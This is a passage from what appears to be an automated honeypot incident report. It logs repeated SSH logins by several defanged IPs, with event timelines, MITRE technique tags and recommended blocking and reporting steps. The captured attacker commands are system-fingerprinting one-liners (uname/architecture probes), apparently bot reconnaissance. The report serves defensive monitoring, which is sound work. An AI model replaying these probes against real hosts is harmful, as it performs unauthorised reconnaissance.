| `2026-07-06 04:37:49` | `cowrie.command.input` |
| `2026-07-06 04:37:49` | `cowrie.command.input` |
| `2026-07-06 04:37:49` | `cowrie.command.input` |
| `2026-07-06 04:37:50` | `cowrie.log.closed` |
| `2026-07-06 04:37:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0bf863ee5c82

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:38 |
| **Last Seen** | 2026-07-06 04:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:38:32` | `cowrie.session.connect` |
| `2026-07-06 04:38:33` | `cowrie.client.version` |
| `2026-07-06 04:38:33` | `cowrie.client.kex` |
| `2026-07-06 04:38:36` | `cowrie.login.success` |
| `2026-07-06 04:38:38` | `cowrie.session.params` |
| `2026-07-06 04:38:38` | `cowrie.command.input` |
| `2026-07-06 04:38:38` | `cowrie.command.input` |
| `2026-07-06 04:38:38` | `cowrie.command.input` |
| `2026-07-06 04:38:38` | `cowrie.command.input` |
| `2026-07-06 04:38:38` | `cowrie.command.input` |
| `2026-07-06 04:38:38` | `cowrie.command.success` |
| `2026-07-06 04:38:38` | `cowrie.command.input` |
| `2026-07-06 04:38:38` | `cowrie.command.input` |
| `2026-07-06 04:38:38` | `cowrie.command.input` |
| `2026-07-06 04:38:38` | `cowrie.command.input` |
| `2026-07-06 04:38:39` | `cowrie.log.closed` |
| `2026-07-06 04:38:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fae3bbbf6671

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-06 04:39 |
| **Last Seen** | 2026-07-06 04:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:39:10` | `cowrie.session.connect` |
| `2026-07-06 04:39:10` | `cowrie.client.version` |
| `2026-07-06 04:39:10` | `cowrie.client.kex` |
| `2026-07-06 04:39:10` | `cowrie.login.success` |
| `2026-07-06 04:39:11` | `cowrie.session.params` |
| `2026-07-06 04:39:11` | `cowrie.command.input` |
| `2026-07-06 04:39:11` | `cowrie.log.closed` |
| `2026-07-06 04:39:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a83bf65654d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:39 |
| **Last Seen** | 2026-07-06 04:39 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:39:21` | `cowrie.session.connect` |
| `2026-07-06 04:39:21` | `cowrie.client.version` |
| `2026-07-06 04:39:21` | `cowrie.client.kex` |
| `2026-07-06 04:39:25` | `cowrie.login.success` |
| `2026-07-06 04:39:27` | `cowrie.session.params` |
| `2026-07-06 04:39:27` | `cowrie.command.input` |
| `2026-07-06 04:39:27` | `cowrie.command.input` |
| `2026-07-06 04:39:27` | `cowrie.command.input` |
| `2026-07-06 04:39:27` | `cowrie.command.input` |
| `2026-07-06 04:39:27` | `cowrie.command.input` |
| `2026-07-06 04:39:27` | `cowrie.command.success` |
| `2026-07-06 04:39:27` | `cowrie.command.input` |
| `2026-07-06 04:39:27` | `cowrie.command.input` |
| `2026-07-06 04:39:27` | `cowrie.command.input` |
| `2026-07-06 04:39:27` | `cowrie.command.input` |
| `2026-07-06 04:39:28` | `cowrie.log.closed` |
| `2026-07-06 04:39:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-938f79fe5d2a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:40 |
| **Last Seen** | 2026-07-06 04:40 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:40:10` | `cowrie.session.connect` |
| `2026-07-06 04:40:10` | `cowrie.client.version` |
| `2026-07-06 04:40:10` | `cowrie.client.kex` |
| `2026-07-06 04:40:14` | `cowrie.login.success` |
| `2026-07-06 04:40:16` | `cowrie.session.params` |
| `2026-07-06 04:40:16` | `cowrie.command.input` |
| `2026-07-06 04:40:16` | `cowrie.command.input` |
| `2026-07-06 04:40:16` | `cowrie.command.input` |
| `2026-07-06 04:40:16` | `cowrie.command.input` |
| `2026-07-06 04:40:16` | `cowrie.command.input` |
| `2026-07-06 04:40:16` | `cowrie.command.success` |
| `2026-07-06 04:40:16` | `cowrie.command.input` |
| `2026-07-06 04:40:16` | `cowrie.command.input` |
| `2026-07-06 04:40:16` | `cowrie.command.input` |
| `2026-07-06 04:40:16` | `cowrie.command.input` |
| `2026-07-06 04:40:17` | `cowrie.log.closed` |
| `2026-07-06 04:40:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2253ec37161f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:40 |
| **Last Seen** | 2026-07-06 04:41 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:40:59` | `cowrie.session.connect` |
| `2026-07-06 04:40:59` | `cowrie.client.version` |
| `2026-07-06 04:40:59` | `cowrie.client.kex` |
| `2026-07-06 04:41:03` | `cowrie.login.success` |
| `2026-07-06 04:41:05` | `cowrie.session.params` |
| `2026-07-06 04:41:05` | `cowrie.command.input` |
| `2026-07-06 04:41:05` | `cowrie.command.input` |
| `2026-07-06 04:41:05` | `cowrie.command.input` |
| `2026-07-06 04:41:05` | `cowrie.command.input` |
| `2026-07-06 04:41:05` | `cowrie.command.input` |
| `2026-07-06 04:41:05` | `cowrie.command.success` |
| `2026-07-06 04:41:05` | `cowrie.command.input` |
| `2026-07-06 04:41:05` | `cowrie.command.input` |
| `2026-07-06 04:41:05` | `cowrie.command.input` |
| `2026-07-06 04:41:05` | `cowrie.command.input` |
| `2026-07-06 04:41:06` | `cowrie.log.closed` |
| `2026-07-06 04:41:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17c9cc0ebcee

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-06 04:41 |
| **Last Seen** | 2026-07-06 04:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:41:02` | `cowrie.session.connect` |
| `2026-07-06 04:41:02` | `cowrie.client.version` |
| `2026-07-06 04:41:02` | `cowrie.client.kex` |
| `2026-07-06 04:41:03` | `cowrie.login.success` |
| `2026-07-06 04:41:03` | `cowrie.session.params` |
| `2026-07-06 04:41:03` | `cowrie.command.input` |
| `2026-07-06 04:41:04` | `cowrie.log.closed` |
| `2026-07-06 04:41:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43f795c64fda

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 04:41 |
| **Last Seen** | 2026-07-06 04:41 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:41:19` | `cowrie.session.connect` |
| `2026-07-06 04:41:21` | `cowrie.client.version` |
| `2026-07-06 04:41:21` | `cowrie.client.kex` |
| `2026-07-06 04:41:27` | `cowrie.login.success` |
| `2026-07-06 04:41:31` | `cowrie.session.params` |
| `2026-07-06 04:41:31` | `cowrie.command.input` |
| `2026-07-06 04:41:33` | `cowrie.log.closed` |
| `2026-07-06 04:41:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7454aff332e0

| Field | Detail |
|---|---|
| **Source IP** | `128.14.236[.]30` |
| **First Seen** | 2026-07-06 04:41 |
| **Last Seen** | 2026-07-06 04:41 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:41:32` | `cowrie.session.connect` |
| `2026-07-06 04:41:32` | `cowrie.login.success` |
| `2026-07-06 04:41:33` | `cowrie.session.params` |
| `2026-07-06 04:41:51` | `cowrie.log.closed` |
| `2026-07-06 04:41:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.14.236[.]30` to AbuseIPDB if not already reported
- [ ] Block `128.14.236[.]30` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6d7f1e27ee2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:41 |
| **Last Seen** | 2026-07-06 04:41 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:41:48` | `cowrie.session.connect` |
| `2026-07-06 04:41:49` | `cowrie.client.version` |
| `2026-07-06 04:41:49` | `cowrie.client.kex` |
| `2026-07-06 04:41:52` | `cowrie.login.success` |
| `2026-07-06 04:41:54` | `cowrie.session.params` |
| `2026-07-06 04:41:54` | `cowrie.command.input` |
| `2026-07-06 04:41:54` | `cowrie.command.input` |
| `2026-07-06 04:41:54` | `cowrie.command.input` |
| `2026-07-06 04:41:54` | `cowrie.command.input` |
| `2026-07-06 04:41:54` | `cowrie.command.input` |
| `2026-07-06 04:41:54` | `cowrie.command.success` |
| `2026-07-06 04:41:54` | `cowrie.command.input` |
| `2026-07-06 04:41:54` | `cowrie.command.input` |
| `2026-07-06 04:41:54` | `cowrie.command.input` |
| `2026-07-06 04:41:54` | `cowrie.command.input` |
| `2026-07-06 04:41:55` | `cowrie.log.closed` |
| `2026-07-06 04:41:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6c25cc9d70a

| Field | Detail |
|---|---|
| **Source IP** | `128.14.236[.]30` |
| **First Seen** | 2026-07-06 04:42 |
| **Last Seen** | 2026-07-06 04:42 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6, User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0[.]0 Safari/537.36 Edg/120.0.0[.]0` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:42:10` | `cowrie.session.connect` |
| `2026-07-06 04:42:10` | `cowrie.login.success` |
| `2026-07-06 04:42:10` | `cowrie.session.params` |
| `2026-07-06 04:42:10` | `cowrie.command.input` |
| `2026-07-06 04:42:10` | `cowrie.command.failed` |
| `2026-07-06 04:42:10` | `cowrie.command.input` |
| `2026-07-06 04:42:10` | `cowrie.command.input` |
| `2026-07-06 04:42:28` | `cowrie.log.closed` |
| `2026-07-06 04:42:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.14.236[.]30` to AbuseIPDB if not already reported
- [ ] Block `128.14.236[.]30` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f10c83aaf094

| Field | Detail |
|---|---|
| **Source IP** | `128.14.236[.]30` |
| **First Seen** | 2026-07-06 04:42 |
| **Last Seen** | 2026-07-06 04:42 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:42:28` | `cowrie.session.connect` |
| `2026-07-06 04:42:28` | `cowrie.login.success` |
| `2026-07-06 04:42:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.14.236[.]30` to AbuseIPDB if not already reported
- [ ] Block `128.14.236[.]30` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b60570b3038a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:42 |
| **Last Seen** | 2026-07-06 04:42 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:42:37` | `cowrie.session.connect` |
| `2026-07-06 04:42:38` | `cowrie.client.version` |
| `2026-07-06 04:42:38` | `cowrie.client.kex` |
| `2026-07-06 04:42:41` | `cowrie.login.success` |
| `2026-07-06 04:42:43` | `cowrie.session.params` |
| `2026-07-06 04:42:43` | `cowrie.command.input` |
| `2026-07-06 04:42:43` | `cowrie.command.input` |
| `2026-07-06 04:42:43` | `cowrie.command.input` |
| `2026-07-06 04:42:43` | `cowrie.command.input` |
| `2026-07-06 04:42:43` | `cowrie.command.input` |
| `2026-07-06 04:42:43` | `cowrie.command.success` |
| `2026-07-06 04:42:43` | `cowrie.command.input` |
| `2026-07-06 04:42:43` | `cowrie.command.input` |
| `2026-07-06 04:42:43` | `cowrie.command.input` |
| `2026-07-06 04:42:43` | `cowrie.command.input` |
| `2026-07-06 04:42:44` | `cowrie.log.closed` |
| `2026-07-06 04:42:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f0cfac99ad5

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-06 04:42 |
| **Last Seen** | 2026-07-06 04:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:42:52` | `cowrie.session.connect` |
| `2026-07-06 04:42:52` | `cowrie.client.version` |
| `2026-07-06 04:42:52` | `cowrie.client.kex` |
| `2026-07-06 04:42:52` | `cowrie.login.success` |
| `2026-07-06 04:42:53` | `cowrie.session.params` |
| `2026-07-06 04:42:53` | `cowrie.command.input` |
| `2026-07-06 04:42:53` | `cowrie.log.closed` |
| `2026-07-06 04:42:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7323ad53483

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:43 |
| **Last Seen** | 2026-07-06 04:43 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:43:26` | `cowrie.session.connect` |
| `2026-07-06 04:43:26` | `cowrie.client.version` |
| `2026-07-06 04:43:26` | `cowrie.client.kex` |
| `2026-07-06 04:43:29` | `cowrie.login.success` |
| `2026-07-06 04:43:31` | `cowrie.session.params` |
| `2026-07-06 04:43:31` | `cowrie.command.input` |
| `2026-07-06 04:43:31` | `cowrie.command.input` |
| `2026-07-06 04:43:31` | `cowrie.command.input` |
| `2026-07-06 04:43:31` | `cowrie.command.input` |
| `2026-07-06 04:43:31` | `cowrie.command.input` |
| `2026-07-06 04:43:31` | `cowrie.command.success` |
| `2026-07-06 04:43:31` | `cowrie.command.input` |
| `2026-07-06 04:43:31` | `cowrie.command.input` |
| `2026-07-06 04:43:31` | `cowrie.command.input` |
| `2026-07-06 04:43:31` | `cowrie.command.input` |
| `2026-07-06 04:43:32` | `cowrie.log.closed` |
| `2026-07-06 04:43:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e719cd06d4a1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:44 |
| **Last Seen** | 2026-07-06 04:44 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:44:13` | `cowrie.session.connect` |
| `2026-07-06 04:44:14` | `cowrie.client.version` |
| `2026-07-06 04:44:14` | `cowrie.client.kex` |
| `2026-07-06 04:44:17` | `cowrie.login.success` |
| `2026-07-06 04:44:19` | `cowrie.session.params` |
| `2026-07-06 04:44:19` | `cowrie.command.input` |
| `2026-07-06 04:44:19` | `cowrie.command.input` |
| `2026-07-06 04:44:19` | `cowrie.command.input` |
| `2026-07-06 04:44:19` | `cowrie.command.input` |
| `2026-07-06 04:44:19` | `cowrie.command.input` |
| `2026-07-06 04:44:19` | `cowrie.command.success` |
| `2026-07-06 04:44:19` | `cowrie.command.input` |
| `2026-07-06 04:44:19` | `cowrie.command.input` |
| `2026-07-06 04:44:19` | `cowrie.command.input` |
| `2026-07-06 04:44:19` | `cowrie.command.input` |
| `2026-07-06 04:44:20` | `cowrie.log.closed` |
| `2026-07-06 04:44:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d94c1977a7d1

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-06 04:44 |
| **Last Seen** | 2026-07-06 04:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 04:44:40` | `cowrie.session.connect` |
| `2026-07-06 04:44:40` | `cowrie.client.version` |
| `2026-07-06 04:44:40` | `cowrie.client.kex` |
| `2026-07-06 04:44:40` | `cowrie.login.success` |
| `2026-07-06 04:44:41` | `cowrie.session.params` |
| `2026-07-06 04:44:41` | `cowrie.command.input` |
| `2026-07-06 04:44:41` | `cowrie.log.closed` |
| `2026-07-06 04:44:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-343db2ff2308

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 04:45 |
| **Last Seen** | 2026-07-06 04:45 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
